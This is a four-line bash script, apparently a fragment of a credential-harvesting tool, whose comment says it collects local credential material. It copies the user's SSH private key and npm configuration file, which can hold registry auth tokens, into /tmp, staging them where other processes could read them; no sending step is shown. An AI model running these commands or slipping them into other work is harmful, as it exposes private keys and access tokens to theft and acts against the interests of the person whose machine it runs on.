#!/bin/bash
# collects local credential material
cat ~/.ssh/id_rsa > /tmp/keydump
cp ~/.npmrc /tmp/npmrc_copy
